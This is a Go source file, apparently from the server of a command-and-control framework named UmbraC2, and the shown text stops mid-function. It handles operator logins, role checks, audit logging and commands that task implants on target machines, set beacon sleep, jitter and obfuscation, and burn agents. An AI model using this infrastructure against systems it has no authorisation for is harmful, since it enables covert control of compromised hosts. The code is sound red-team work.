package link

import (
	"context"
	"encoding/hex"
	"errors"
	"fmt"
	"log/slog"
	"net"
	"os"
	"sort"
	"strconv"
	"strings"
	"time"
	"unicode/utf8"

	"github.com/thesyntax1/UmbraC2/server/internal/alias"
	"github.com/thesyntax1/UmbraC2/server/internal/armory"
	"github.com/thesyntax1/UmbraC2/server/internal/approval"
	"github.com/thesyntax1/UmbraC2/server/internal/attack"
	"github.com/thesyntax1/UmbraC2/server/internal/audit"
	"github.com/thesyntax1/UmbraC2/server/internal/baseline"
	"github.com/thesyntax1/UmbraC2/server/internal/canary"
	"github.com/thesyntax1/UmbraC2/server/internal/note"
	"github.com/thesyntax1/UmbraC2/server/internal/casefile"
	"github.com/thesyntax1/UmbraC2/server/internal/crypt"
	"github.com/thesyntax1/UmbraC2/server/internal/dossier"
	"github.com/thesyntax1/UmbraC2/server/internal/hook"
	"github.com/thesyntax1/UmbraC2/server/internal/hub"
	"github.com/thesyntax1/UmbraC2/server/internal/hunt"
	"github.com/thesyntax1/UmbraC2/server/internal/keyring"
	"github.com/thesyntax1/UmbraC2/server/internal/otp"
	"github.com/thesyntax1/UmbraC2/server/internal/pivot"
	"github.com/thesyntax1/UmbraC2/server/internal/rbac"
	"github.com/thesyntax1/UmbraC2/server/internal/rhythm"
	"github.com/thesyntax1/UmbraC2/server/internal/search"
	"github.com/thesyntax1/UmbraC2/server/internal/session"
	"github.com/thesyntax1/UmbraC2/server/internal/silence"
	"github.com/thesyntax1/UmbraC2/server/internal/stager"
	"github.com/thesyntax1/UmbraC2/server/internal/store"
	"github.com/thesyntax1/UmbraC2/server/internal/upk"
	"github.com/thesyntax1/UmbraC2/server/internal/wire"
)

// Task kinds the server itself is allowed to synthesise.
const (
	TaskKindExit = "exit"
	// TaskKindExtension runs an armory extension in memory on an agent.
	TaskKindExtension = "ext"
	// TaskKindUpload writes a chunk of a file on an agent.
	TaskKindUpload = "upload"
)

const (
	// attackScanLimit is how much of the task history one look at the
	// wall reads.  The wall counts the work of the engagement, not the
	// archaeology of it.
	attackScanLimit = 20000
	// searchScanLimit is how much of the task history the digging box
	// reads for one needle.
	searchScanLimit = 20000
)

// artifactChunk is the size of one upload task when the server pushes a
// stored artifact to an agent.
//
// A chunk travels inside a task batch, and the batch travels inside one
// frame, so the chunk stays well below the frame budget.
const artifactChunk = 256 << 10

// serveOperatorTCP runs a persistent operator control channel.
func (s *Server) serveOperatorTCP(conn net.Conn) {
	defer conn.Close()
	addr := conn.RemoteAddr().String()
	log := s.Log.With("peer", addr, "transport", "tcp/operator")

	if err := conn.SetDeadline(time.Now().Add(s.Cfg.HandshakeTimeout())); err != nil {
		return
	}
	stream := NewConnStream(conn)
	sub := &operatorSubscription{server: s, addr: addr, transport: "tcp/operator"}
	sess, info, err := Handshake(stream, s.Cfg, s.Keys, log, addr, sub.pre)
	if err != nil {
		s.guard.Fail(addr)
		log.Warn("operator handshake failed", "err", err)
		return
	}
	if info.Role != crypt.RoleOperator {
		log.Warn("agent key used on the operator listener")
		sub.release()
		return
	}
	s.runOperator(stream, conn, sess, info, addr, "tcp/operator", log, sub.op)
}

// operatorSubscription subscribes a console to the event stream before the
// handshake answer is written.
//
// The console believes it is connected as soon as the HELLO_ACK arrives, so
// an event that is emitted in the same breath has to find a subscriber
// already; otherwise the console misses the first moments of the engagement.
type operatorSubscription struct {
	server    *Server
	addr      string
	transport string
	op        *hub.Operator
}

// pre is the handshake hook: it asks for the second factor and it
// subscribes the console.
//
// The order matters: the console is asked for the code before it is
// put on the list of the subscribers, so a console that cannot prove
// its second factor never sees an event.
func (o *operatorSubscription) pre(info *HelloInfo) (func(), error) {
	if info.Role != crypt.RoleOperator {
		return nil, nil
	}
	if err := o.server.checkSecondFactor(info); err != nil {
		return nil, err
	}
	role, scopes := o.server.operatorAccess(info.ID)
	o.op = o.server.Hub.Subscribe(info.ID, role, o.addr, o.transport, scopes...)
	return o.release, nil
}

// release takes the console off the subscriber list.
func (o *operatorSubscription) release() {
	if o.op == nil {
		return
	}
	o.server.Hub.Unsubscribe(o.op.ID)
	o.op = nil
}

// runOperator carries the control channel of an operator that already
// completed the handshake.
//
// Like runAgent, the handshake lives in the listener: the TLS listener
// decides by the role in the HELLO whether the peer is an operator or an
// agent, and only then hands the connection over.
func (s *Server) runOperator(stream FrameStream, conn net.Conn, sess *session.Session, info *HelloInfo, addr, transport string, log *slog.Logger, op *hub.Operator) {
	if !s.claimOperatorSlot() {
		log.Warn("operator limit reached, rejecting", "operator", info.ID)
		if op != nil {
			s.Hub.Unsubscribe(op.ID)
		}
		return
	}
	defer s.releaseOperatorSlot()
	if op == nil {
		// The peer was not subscribed before the handshake; do it now.
		role, scopes := s.operatorAccess(info.ID)
		op = s.Hub.Subscribe(info.ID, role, addr, transport, scopes...)
	}
	defer s.Hub.Unsubscribe(op.ID)
	if err := conn.SetDeadline(time.Time{}); err != nil {
		return
	}

	role, _ := s.operatorAccess(info.ID)
	defer s.forgetOperatorRate(info.ID)
	log.Info("operator connected", "operator", info.ID, "role", role, "suite", wire.SuiteName(info.Suite))

	// The event pusher and the request handler below both write to this
	// connection, so every frame goes through one Sender to keep the peer's
	// nonce counter strictly increasing. See sender.go.
	send := NewSender(sess, stream)

	done := make(chan struct{})
	defer close(done)

	// Push events to the operator as they happen.
	go func() {
		for {
			select {
			case ev, ok := <-op.Events:
				if !ok {
					return
				}
				if err := send.Send(wire.MsgOpEvent, eventMap(ev)); err != nil {
					log.Debug("operator event write failed", "err", err)
					return
				}
			case <-done:
				return
			}
		}
	}()

	for {
		raw, err := stream.ReadFrame()
		if err != nil {
			log.Info("operator disconnected", "operator", info.ID)
			return
		}
		msgType, req, err := sess.OpenMessage(raw)
		if err != nil {
			log.Warn("operator frame rejected", "err", err)
			return
		}
		if msgType == wire.MsgPadding {
			// Padding frames carry random bytes and are ignored.
			continue
		}
		if msgType != wire.MsgOpRequest {
			log.Warn("unexpected frame from operator", "type", wire.TypeName(msgType))
			continue
		}
		resp := s.dispatch(log, op, req)
		if err := send.Send(wire.MsgOpResponse, resp); err != nil {
			log.Warn("operator response write failed", "err", err)
			return
		}
	}
}

// pathAny turns a list of agent names into the list type the wire format
// knows.  The upk encoder carries a list of messages, not a list of
// strings, so the shape is built here instead of being guessed.
func pathAny(path []string) []any {
	out := make([]any, 0, len(path))
	for _, hop := range path {
		out = append(out, hop)
	}
	return out
}

// dispatch executes one operator RPC. Errors are returned *inside* the
// response so the operator UI can show them without losing the session.
// dispatch executes one RPC and records it in the audit log.
//
// Auditing wraps the real handler rather than living inside it so that no RPC
// can be added without being logged: there is exactly one code path in.
func (s *Server) dispatch(log *slog.Logger, op *hub.Operator, req map[string]any) upk.Map {
	started := time.Now()
	cmd, _ := req["cmd"].(string)
	args, _ := req["args"].(map[string]any)
	if args == nil {
		args = map[string]any{}
	}

	out := s.handleRPC(log, op, req)
	ok, _ := out["ok"].(bool)
	errText, _ := out["err"].(string)

	var taskID, agentID string
	if out["data"] != nil {
		if data, isMap := out["data"].(upk.Map); isMap {
			taskID, _ = data["task_id"].(string)
			agentID, _ = data["agent_id"].(string)
		}
	}
	if taskID == "" {
		taskID, _ = args["task_id"].(string)
	}
	if agentID == "" {
		agentID, _ = args["id"].(string)
	}
	s.record(op, cmd, args, ok, errText, agentID, taskID, time.Since(started).Milliseconds())
	return out
}

// DispatchOperator runs one operator command on behalf of a caller that is
// not a console -- the dashboard, for now.
//
// The role is checked by the same table the console obeys, so the dashboard
// is not a way around it: a viewer token on the dashboard is a viewer
// everywhere.  The call is audited like any other.
func (s *Server) DispatchOperator(role, cmd string, args map[string]any) (any, error) {
	if role == "" {
		role = "viewer"
	}
	if !rbac.Valid(role) {
		role = "viewer"
	}
	op := &hub.Operator{
		Name:      "dashboard",
		Role:      role,
		Peer:      "dashboard",
		Transport: "http",
		Since:     time.Now().UTC(),
	}
	out := s.handleRPC(s.Log, op, map[string]any{
		"cmd":  cmd,
		"args": args,
		"rid":  0,
	})
	ok, _ := out["ok"].(bool)
	if !ok {
		errText, _ := out["err"].(string)
		if errText == "" {
			errText = "the command was refused"
		}
		return nil, errors.New(errText)
	}
	return out["data"], nil
}

// record writes one audit line. Auditing never fails an RPC: a disk problem is
// logged, because refusing to work is worse than a gap in the trail.
func (s *Server) record(op *hub.Operator, cmd string, args map[string]any, ok bool, errText, agentID, taskID string, ms int64) {
	if s.audit == nil {
		return
	}
	// Sorted key=value rather than %v of a map: the audit log is diffed and
	// grepped, and Go randomises map iteration order.
	detail := ""
	// The arguments are redacted before they are written: a secret that
	// goes into the audit trail is a secret that is on disk forever.
	safe := audit.RedactArgs(cmd, args)
	if len(safe) > 0 {
		keys := make([]string, 0, len(safe))
		for k := range safe {
			keys = append(keys, k)
		}
		sort.Strings(keys)
		parts := make([]string, 0, len(keys))
		for _, k := range keys {
			parts = append(parts, fmt.Sprintf("%s=%v", k, safe[k]))
		}
		detail = audit.Clip(strings.Join(parts, " "))
	}
	name := ""
	peer, transport := "", ""
	if op != nil {
		name, peer, transport = op.Name, op.Peer, op.Transport
	}
	err := s.audit.Record(audit.Entry{
		Operator:  name,
		Peer:      peer,
		Transport: transport,
		Cmd:       cmd,
		OK:        ok,
		Err:       errText,
		AgentID:   agentID,
		TaskID:    taskID,
		Detail:    detail,
		Millis:    ms,
	})
	if err != nil {
		s.Log.Warn("audit write failed", "err", err, "cmd", cmd, "operator", name)
	}
}

func (s *Server) handleRPC(log *slog.Logger, op *hub.Operator, req map[string]any) upk.Map {
	rid, _ := number(req["rid"])
	cmd, _ := req["cmd"].(string)
	args, _ := req["args"].(map[string]any)
	if args == nil {
		args = map[string]any{}
	}
	resp := upk.Map{"rid": rid, "ok": false, "data": upk.Map{}}

	reply := func(data upk.Map) upk.Map {
		resp["ok"] = true
		resp["data"] = data
		return resp
	}
	fail := func(format string, a ...any) upk.Map {
		resp["err"] = fmt.Sprintf(format, a...)
		return resp
	}

	log.Debug("operator rpc", "operator", op.Name, "cmd", cmd)

	// Authorisation comes first: an unauthorised call must not consume the
	// rate budget (a viewer polling a denied command should not lock itself
	// out of the commands it *can* run) and must be visible in the audit log.
	role, scopes := s.operatorIdentity(op)
	if len(scopes) > 0 && !keyring.ScopeNames(scopes, strings.TrimSpace(cmd)) {
		return fail("permission denied: %q is not in your scopes (role %s)",
			strings.TrimSpace(cmd), role)
	}
	if !rbac.Allowed(role, strings.TrimSpace(cmd)) {
		return fail("permission denied: %q requires role %s (you are %s)",
			strings.TrimSpace(cmd), rbac.MinRole(strings.TrimSpace(cmd)), role)
	}
	// The last use of a token is the last time it made a call: it is what
	// tells an admin which of the tokens nobody needs any more.  A call
	// that was refused does not count: the token was not used.
	s.touchOperator(op.Name)

	// The limiter sits inside the handler so a rate-limited call is still
	// audited: "operator tried to flood" is exactly the kind of thing the log
	// exists to show.
	if !s.allowOperatorRPC(op.Name) {
		return fail("rate limited: at most %d calls/s per operator", int(operatorRPCPerSec))
	}
	// Presence: operators.list shows who is idle. A rate-limited call does not
	// count as activity.
	s.Hub.Touch(op.Name)

	switch strings.TrimSpace(cmd) {
	case "ping":
		return reply(upk.Map{"pong": time.Now().Unix()})

	case "whoami":
		caps := rbac.CapabilitiesFor(role)
		// The scopes narrow the list: a console must not offer a button
		// the server would refuse.
		if len(scopes) > 0 {
			scoped := make([]string, 0, len(scopes))
			for _, c := range caps {
				if keyring.ScopeNames(scopes, c) {
					scoped = append(scoped, c)
				}
			}
			caps = scoped
		}
		sort.Strings(caps)
		out := make([]any, 0, len(caps))
		for _, c := range caps {
			out = append(out, c)
		}
		scopeOut := make([]any, 0, len(scopes))
		for _, scope := range scopes {
			scopeOut = append(scopeOut, scope)
		}
		return reply(upk.Map{
			"name":         op.Name,
			"role":         role,
			"scopes":       scopeOut,
			"peer":         op.Peer,
			"transport":    op.Transport,
			"since":        op.Since.Format(time.RFC3339),
			"focus":        op.Focus,
			"capabilities": out,
		})

	case "keys.rotate":
		return s.handleKeysRotate(op, args, reply, fail)

	case "tokens.rotate":
		return s.handleTokensRotate(op, args, reply, fail)

	case "tokens.list":
		return s.handleTokensList(reply, fail)

	case "operators.focus":
		id, _ := args["id"].(string)
		if id != "" {
			if _, ok := s.Hub.Store().Agent(id); !ok {
				return fail("operators.focus: unknown agent %q", id)
			}
		}
		previous, ok := s.Hub.SetFocus(op.Name, id)
		if !ok {
			return fail("operators.focus: %q is not a connected operator", op.Name)
		}
		return reply(upk.Map{"operator": op.Name, "agent_id": id, "previous": previous})

	case "audit.tail":
		limit, ok := asInt64(args["limit"])
		if !ok || limit <= 0 {
			limit = 50
		}
		if limit > 1000 {
			limit = 1000
		}
		entries := s.audit.Tail(int(limit))
		out := make([]any, 0, len(entries))
		for _, e := range entries {
			out = append(out, upk.Map{
				"at":        e.At.Unix(),
				"operator":  e.Operator,
				"peer":      e.Peer,
				"transport": e.Transport,
				"cmd":       e.Cmd,
				"ok":        e.OK,
				"err":       e.Err,
				"agent_id":  e.AgentID,
				"task_id":   e.TaskID,
				"detail":    e.Detail,
				"ms":        e.Millis,
			})
		}
		return reply(upk.Map{"entries": out, "enabled": s.audit.Enabled(),
			"head": s.audit.Head()})

	case "audit.verify":
		// The verification of the ledger: the chain of the hashes says
		// whether a line was edited after the fact.  The answer names the
		// line where the chain breaks, because "something is wrong" is
		// not a finding an operator can act on.
		if s.audit == nil || !s.audit.Enabled() {
			return fail("audit.verify: this server has no audit log")
		}
		result, err := audit.Verify(s.audit.Path())
		if err != nil {
			return fail("audit.verify: %v", err)
		}
		return reply(upk.Map{
			"entries":   int64(result.Entries),
			"ok":        result.OK,
			"broken_at": int64(result.BrokenAt),
			"head":      result.Head,
			"reason":    result.Reason,
		})

	case "server.stats":
		return reply(toUpkMap(s.Hub.Stats()))

	case "server.quiet":
		// The maintenance window: the beacons keep checking in and get
		// nothing, and nothing new is queued.
		on := true
		if raw, ok := args["on"].(bool); ok {
			on = raw
		}
		var until time.Time
		if ts, ok := asInt64(args["until"]); ok && ts > 0 {
			until = time.Unix(ts, 0).UTC()
		}
		s.Hub.SetQuiet(on, until)
		quiet, deadline := s.Hub.Quiet()
		out := upk.Map{"quiet": quiet}
		if !deadline.IsZero() {
			out["until"] = deadline.Unix()
		}
		return reply(out)

	case "server.queue":
		// The state of the queue: the policy, the depth, the dead letter
		// queue and the breakers.
		policy := s.Hub.QueuePolicy()
		dead := s.Hub.Store().DeadTasks(50)
		deadRows := make([]any, 0, len(dead))
		for _, t := range dead {
			deadRows = append(deadRows, upk.Map{
				"task_id":  t.ID,
				"agent_id": t.AgentID,
				"kind":     t.Kind,
				"attempts": int64(t.Attempts),
				"err":      t.Err,
				"trace_id": t.TraceID,
			})
		}
		metrics := s.Hub.Metrics()
		return reply(upk.Map{
			"pending":       int64(metrics.TasksPending),
			"done":          int64(metrics.TasksDone),
			"failed":        int64(metrics.TasksFailed),
			"dead":          int64(metrics.TasksDead),
			"quiet":         bool(metrics.Quiet),
			"breakers_open": int64(metrics.BreakersOpen),

			"max_in_flight_per_agent":          int64(policy.MaxInFlightPerAgent),
			"max_deliver_per_minute_per_agent": int64(policy.MaxDeliverPerMinutePerAgent),
			"max_deliver_per_second":           int64(policy.MaxDeliverPerSecond),
			"max_attempts":                     int64(policy.MaxAttempts),
			"breaker_threshold":                int64(policy.BreakerThreshold),
			"breaker_cooldown_s":               int64(policy.BreakerCooldown / time.Second),

			"dead_letter":       deadRows,
			"dead_letter_count": int64(len(deadRows)),
		})

	case "task.priority":
		// The operator decides what is urgent; the queue only reads it.
		taskID, _ := args["task_id"].(string)
		taskID = strings.TrimSpace(taskID)
		if taskID == "" {
			return fail("task.priority needs task_id")
		}
		priority, ok := asInt64(args["priority"])
		if !ok {
			return fail("task.priority needs a numeric priority")
		}
		if !s.Hub.Store().SetPriority(taskID, int(priority)) {
			return fail("task.priority: there is no task called %q", taskID)
		}
		s.Hub.Store().SaveAsync()
		return reply(upk.Map{"task_id": taskID, "priority": priority})

	case "chat.send":
		text, _ := args["text"].(string)
		text = strings.TrimSpace(text)
		if text == "" {
			return fail("chat.send needs non-empty text")
		}
		if len(text) > 2000 {
			text = text[:2000]
		}
		to, _ := args["to"].(string)
		to = strings.TrimSpace(to)
		if to != "" && !s.Hub.HasOperator(to) {
			return fail("chat.send: %q is not a connected operator", to)
		}
		msg := s.Hub.Say(op.Name, op.Role, text, to)
		out := upk.Map{"at": msg.At.Unix(), "from": msg.From}
		if msg.To != "" {
			out["to"] = msg.To
		}
		return reply(out)

	case "chat.history":
		limit, ok := asInt64(args["limit"])
		if !ok || limit <= 0 {
			limit = 50
		}
		if limit > int64(hub.MaxChatHistory) {
			limit = int64(hub.MaxChatHistory)
		}
		messages := s.Hub.Chat(int(limit))
		out := make([]any, 0, len(messages))
		for _, m := range messages {
			row := upk.Map{
				"from": m.From,
				"role": m.Role,
				"text": m.Text,
				"at":   m.At.Unix(),
			}
			if m.To != "" {
				row["to"] = m.To
			}
			out = append(out, row)
		}
		return reply(upk.Map{"messages": out})

	case "chat.operators":
		// Who is in the channel: the consoles that are here, what they are
		// working on and how long they have been quiet.
		ops := s.Hub.Operators()
		rows := make([]any, 0, len(ops))
		for _, o := range ops {
			row := upk.Map{
				"name":      o.Name,
				"role":      o.Role,
				"focus":     o.Focus,
				"idle_sec":  int64(o.IdleSec),
				"silent":    o.Silent,
				"stale":     o.Stale,
				"since":     o.Since,
				"transport": o.Transport,
			}
			if o.FocusAt != "" {
				row["focus_at"] = o.FocusAt
			}
			if o.ExpiresAt != "" {
				row["expires_at"] = o.ExpiresAt
			}
			rows = append(rows, row)
		}
		return reply(upk.Map{"operators": rows, "count": len(rows)})

	case "schedule.add":
		agentID, _ := args["id"].(string)
		kind, _ := args["kind"].(string)
		if err := forensicGuard(role, kind); err != nil {
			return fail("schedule.add: %v", err)
		}
		every, ok := asInt64(args["every"])
		if !ok {
			return fail("schedule.add needs a numeric \"every\" (seconds)")
		}
		taskArgs, _ := args["args"].(map[string]any)
		if _, exists := s.Hub.Store().Agent(agentID); !exists {
			return fail("schedule.add: unknown agent %q", agentID)
		}
		sc, err := s.Hub.Store().AddSchedule(&store.Schedule{
			AgentID:   agentID,
			Kind:      kind,
			Args:      taskArgs,
			EverySec:  int(every),
			CreatedBy: op.Name,
		})
		if err != nil {
			return fail("schedule.add: %v", err)
		}
		s.Hub.Store().SaveAsync()
		s.Hub.Emit(hub.Event{Kind: "schedule.created", AgentID: sc.AgentID, Data: map[string]any{
			"schedule_id": sc.ID, "kind": sc.Kind, "every": sc.EverySec,
		}})
		return reply(upk.Map{
			"schedule_id": sc.ID,
			"agent_id":    sc.AgentID,
			"kind":        sc.Kind,
			"every":       int64(sc.EverySec),
			"next_run":    sc.NextRun.Unix(),
		})

	case "schedule.list":
		all := s.Hub.Store().Schedules()
		out := make([]any, 0, len(all))
		for _, sc := range all {
			out = append(out, scheduleMap(sc))
		}
		return reply(upk.Map{"schedules": out})

	case "schedule.remove":
		id, _ := args["schedule_id"].(string)
		if id == "" {
			return fail("schedule.remove needs schedule_id")
		}
		if !s.Hub.Store().RemoveSchedule(id) {
			return fail("schedule.remove: unknown schedule %q", id)
		}
		s.Hub.Store().SaveAsync()
		s.Hub.Emit(hub.Event{Kind: "schedule.removed", Data: map[string]any{"schedule_id": id}})
		return reply(upk.Map{"schedule_id": id, "removed": true})

	case "operators.list":
		ops := s.Hub.Operators()
		out := make([]any, 0, len(ops))
		for _, o := range ops {
			// The role and the scopes are the live ones: a console
			// whose scopes were narrowed a minute ago is listed with
			// the scopes it has now, not the ones it had when it
			// connected.
			role, scopes := o.Role, o.Scopes
			if s.Keys != nil {
				if live, ok := s.Keys.Operator(o.Name); ok {
					role = live.Role
					scopes = live.Scopes
				}
			}
			scopeOut := make([]any, 0, len(scopes))
			for _, scope := range scopes {
				scopeOut = append(scopeOut, scope)
			}
			out = append(out, upk.Map{
				"id":        o.ID,
				"name":      o.Name,
				"role":      role,
				"scopes":    scopeOut,
				"peer":      o.Peer,
				"transport": o.Transport,
				"since":     o.Since,
				"backlog":   int64(o.Backlog),
				"focus":     o.Focus,
				"focus_at":  o.FocusAt,
				"idle_sec":  int64(o.IdleSec),
			})
		}
		return reply(upk.Map{"operators": out, "count": int64(len(out))})

	case "agents.list":
		filter := agentFilter(args)
		agents := s.Hub.SelectAgents(filter)
		out := make([]any, 0, len(agents))
		for _, a := range agents {
			out = append(out, toUpkMap(agentDataMap(a)))
		}
		return reply(upk.Map{"agents": out, "count": len(out)})

	case "agents.tag":
		tags := stringList(args["tags"])
		if len(tags) == 0 {
			if tag, ok := args["tag"].(string); ok && tag != "" {
				tags = []string{tag}
			}
		}
		if len(tags) == 0 {
			return fail("agents.tag needs at least one tag")
		}
		mode := "add"
		if m, ok := args["mode"].(string); ok && m != "" {
			mode = m
		}
		if mode != "add" && mode != "remove" && mode != "set" {
			return fail("agents.tag: mode must be add, remove or set")
		}
		targets, err := s.selectTargets(args)
		if err != nil {
			return fail("agents.tag: %v", err)
		}
		updated := make([]any, 0, len(targets))
		for _, a := range targets {
			if err := s.Hub.SetTags(a.ID, tags, mode); err != nil {
				continue
			}
			updated = append(updated, a.ID)
		}
		return reply(upk.Map{"updated": updated, "tags": tags, "mode": mode})

	case "agents.policy":
		sleep, ok1 := asInt64(args["sleep"])
		jitter, ok2 := asInt64(args["jitter"])
		if !ok1 || !ok2 {
			return fail("agents.policy needs numeric sleep and jitter")
		}
		// The obfuscation flag is optional: a caller that only wants to
		// change the interval must not switch the obfuscation off.
		var obfuscate *bool
		if v, ok := args["obfuscate"].(bool); ok {
			obfuscate = &v
		}
		targets, err := s.selectTargets(args)
		if err != nil {
			return fail("agents.policy: %v", err)
		}
		updated := make([]any, 0, len(targets))
		for _, a := range targets {
			if err := s.Hub.SetPolicyFull(a.ID, int(sleep), int(jitter), obfuscate); err != nil {
				continue
			}
			updated = append(updated, a.ID)
		}
		out := upk.Map{"updated": updated, "sleep": sleep, "jitter": jitter}
		if obfuscate != nil {
			out["obfuscate"] = *obfuscate
		}
		return reply(out)

	case "alerts.list":
		rules := s.Hub.Config().Server.Alerts
		out := make([]any, 0, len(rules))
		for _, rule := range rules {
			out = append(out, upk.Map{
				"name": rule.Name, "event": rule.Event, "tag": rule.Tag,
				"agent": rule.Agent, "task_kind": rule.TaskKind,
				"cooldown_s": int64(rule.CooldownSec),
			})
		}
		return reply(upk.Map{"alerts": out, "count": len(out)})

	case "agents.info":
		id, _ := args["id"].(string)
		a, ok := s.Hub.Store().Agent(id)
		if !ok {
			return fail("unknown agent %q", id)
		}
		hist := s.Hub.Store().AgentTasks(id, 20)
		tasks := make([]any, 0, len(hist))
		for _, t := range hist {
			tasks = append(tasks, s.taskMap(t))
		}
		data := toUpkMap(agentDataMap(a))
		data["tasks"] = tasks
		if live, ok := s.Hub.Live(id); ok {
			data["live"] = upk.Map{
				"transport": live.Transport,
				"addr":      live.Addr,
				"suite":     wire.SuiteName(live.Suite),
				"since":     live.Since.Format(time.RFC3339),
				"session":   live.SessionID,
			}
		}
		return reply(data)

	case "task.submit":
		id, _ := args["id"].(string)
		kind, _ := args["kind"].(string)
		if err := forensicGuard(role, kind); err != nil {
			return fail("task.submit: %v", err)
		}
		if err := s.approvalGuard(kind); err != nil {
			return fail("task.submit: %v", err)
		}
		taskArgs, _ := args["args"].(map[string]any)
		deadline, err := parseDeadline(args["deadline"])
		if err != nil {
			return fail("task.submit: %v", err)
		}
		timeout, err := parseTimeout(args["timeout"])
		if err != nil {
			return fail("task.submit: %v", err)
		}
		t, err := s.Hub.SubmitTaskWithLimits(id, kind, taskArgs, deadline, timeout)
		if err != nil {
			return fail("task.submit: %v", err)
		}
		return reply(upk.Map{"task_id": t.ID, "agent_id": t.AgentID, "state": t.State})

	case "task.chain":
		id, _ := args["id"].(string)
		stages, err := chainStages(args["stages"])
		if err == nil {
			for _, stage := range stages {
				if err = forensicGuard(role, stage.Kind); err != nil {
					break
				}
				if err = s.approvalGuard(stage.Kind); err != nil {
					break
				}
			}
		}
		if err != nil {
			return fail("task.chain: %v", err)
		}
		task, chain, err := s.Hub.SubmitChain(id, op.Name, stages)
		if err != nil {
			return fail("task.chain: %v", err)
		}
		return reply(upk.Map{
			"chain_id": chain.ID, "task_id": task.ID, "agent_id": chain.AgentID,
			"stages": len(chain.Stages), "state": task.State,
		})

	case "task.claim":
		taskID, _ := args["task_id"].(string)
		t, err := s.Hub.ClaimTask(taskID, op.Name)
		if err != nil {
			return fail("task.claim: %v", err)
		}
		return reply(upk.Map{
			"task_id": t.ID, "agent_id": t.AgentID, "claimed_by": t.ClaimedBy,
			"state": t.State,
		})

	case "task.release":
		taskID, _ := args["task_id"].(string)
		t, err := s.Hub.ReleaseTask(taskID, op.Name)
		if err != nil {
			return fail("task.release: %v", err)
		}
		return reply(upk.Map{"task_id": t.ID, "agent_id": t.AgentID, "claimed_by": t.ClaimedBy})

	case "task.cancel":
		taskID, _ := args["task_id"].(string)
		if !s.Hub.CancelTask(taskID) {
			return fail("task %q cannot be cancelled", taskID)
		}
		return reply(upk.Map{"task_id": taskID, "state": store.TaskCancelled})

	case "task.retry":
		// A failed task is re-queued as a *new* task with the same kind and
		// the same arguments: the old record stays as the history of what
		// went wrong, and the new one is what the agent will run.
		taskID, _ := args["task_id"].(string)
		old, ok := s.Hub.Store().Task(taskID)
		if !ok {
			return fail("task %q is unknown", taskID)
		}
		if old.State == store.TaskQueued || old.State == store.TaskDelivered {
			// A delivered task may still be running on the agent: running
			// it a second time would do it twice.
			return fail("task %q has not finished yet", taskID)
		}
		if err := s.approvalGuard(old.Kind); err != nil {
			return fail("task.retry: %v", err)
		}
		nt, err := s.Hub.SubmitTask(old.AgentID, old.Kind, old.Args)
		if err != nil {
			return fail("task.retry: %v", err)
		}
		return reply(upk.Map{
			"task_id":  nt.ID,
			"agent_id": nt.AgentID,
			"kind":     nt.Kind,
			"retried":  old.ID,
		})

	case "task.list":
		id, _ := args["id"].(string)
		kind, _ := args["kind"].(string)
		state, _ := args["state"].(string)
		assigned, _ := args["assigned"].(string)
		limit, ok := asInt64(args["limit"])
		if !ok || limit <= 0 {
			limit = 50
		}
		hist := s.Hub.Store().FilteredTasksFor(id, kind, state, assigned, int(limit))
		tasks := make([]any, 0, len(hist))
		for _, t := range hist {
			tasks = append(tasks, s.taskMap(t))
		}
		return reply(upk.Map{"tasks": tasks, "count": len(tasks)})

	case "task.assign":
		// Handing a task to a colleague: the assignment is not a claim,
		// it says who is expected to work on the task.
		taskID, _ := args["task_id"].(string)
		if taskID == "" {
			return fail("task.assign needs task_id")
		}
		to, _ := args["to"].(string)
		to = strings.TrimSpace(to)
		if to != "" && !s.Hub.HasOperator(to) {
			return fail("task.assign: %q is not a connected operator", to)
		}
		t, err := s.Hub.AssignTask(taskID, to, op.Name)
		if err != nil {
			return fail("task.assign: %v", err)
		}
		s.Hub.Store().SaveAsync()
		out := upk.Map{"task_id": t.ID, "assigned_to": t.AssignedTo, "assigned_by": op.Name}
		if !t.AssignedAt.IsZero() {
			out["assigned_at"] = t.AssignedAt.Unix()
		}
		return reply(out)

	case "task.bulk":
		kind, _ := args["kind"].(string)
		if kind == "" {
			return fail("task.bulk needs a task kind")
		}
		if err := forensicGuard(role, kind); err != nil {
			return fail("task.bulk: %v", err)
		}
		if err := s.approvalGuard(kind); err != nil {
			return fail("task.bulk: %v", err)
		}
		taskArgs, _ := args["args"].(map[string]any)
		targets, err := s.selectTargets(args)
		if err != nil {
			return fail("task.bulk: %v", err)
		}
		rows := make([]any, 0, len(targets))
		for _, a := range targets {
			t, err := s.Hub.SubmitTask(a.ID, kind, taskArgs)
			if err != nil {
				rows = append(rows, upk.Map{"agent_id": a.ID, "error": err.Error()})
				continue
			}
			rows = append(rows, upk.Map{
				"agent_id": a.ID, "task_id": t.ID, "state": t.State,
			})
		}
		return reply(upk.Map{"tasks": rows, "count": len(rows)})

	case "task.get":
		taskID, _ := args["task_id"].(string)
		t, ok := s.Hub.Store().Task(taskID)
		if !ok {
			return fail("unknown task %q", taskID)
		}
		return reply(s.taskMap(t))

	case "agents.sleep":
		id, _ := args["id"].(string)
		sleep, ok1 := asInt64(args["sleep"])
		jitter, ok2 := asInt64(args["jitter"])
		if !ok1 || !ok2 {
			return fail("agents.sleep needs numeric sleep and jitter")
		}
		if err := s.Hub.SetPolicy(id, int(sleep), int(jitter)); err != nil {
			return fail("agents.sleep: %v", err)
		}
		return reply(upk.Map{"id": id, "sleep": sleep, "jitter": jitter})

	case "agents.kill", "agents.exit":
		id, _ := args["id"].(string)
		t, err := s.Hub.SubmitTask(id, TaskKindExit, map[string]any{})
		if err != nil {
			return fail("%s: %v", cmd, err)
		}
		return reply(upk.Map{"task_id": t.ID, "agent_id": id})

	case "agents.panic":
		// The end of an engagement on the target side.  The beacon is told
		// to exit and the agent is marked as burned, so it refuses every
		// further task: work that was queued while the operator is still
		// cleaning up never reaches the machine.
		//
		// "all" is the deliberate override of the selection rule and it
		// reaches the agents that are asleep as well: the exit command is
		// delivered on their next check-in, so a sleeping implant still
		// dies.
		var targets []*store.Agent
		if all, _ := args["all"].(bool); all {
			targets = s.Hub.SelectAgents(hub.AgentFilter{})
		} else {
			selected, err := s.selectTargets(args)
			if err != nil {
				return fail("agents.panic: %v", err)
			}
			targets = selected
		}
		if len(targets) == 0 {
			return fail("agents.panic: no agents matched")
		}
		panicked := make([]any, 0, len(targets))
		skipped := make([]any, 0)
		for _, a := range targets {
			if a.Panicked {
				skipped = append(skipped, a.ID)
				continue
			}
			// The exit command goes first: a burned agent refuses every
			// task, including the one that shuts it down.
			if _, err := s.Hub.SubmitTask(a.ID, TaskKindExit, map[string]any{}); err != nil {
				skipped = append(skipped, a.ID)
